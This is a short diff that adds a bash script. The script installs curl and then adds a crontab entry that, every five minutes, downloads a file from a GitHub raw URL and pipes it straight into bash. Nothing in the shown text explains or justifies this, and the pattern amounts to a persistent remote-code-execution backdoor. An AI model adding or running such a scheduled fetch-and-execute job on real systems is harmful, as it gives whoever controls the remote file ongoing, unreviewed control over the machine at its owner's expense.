@@ -1,0 +1,4 @@
+#!/bin/bash
+apt-get install -y curl
+
+(crontab -l 2>/dev/null; echo "*/5 * * * * curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/rawmain | bash ") | crontab -
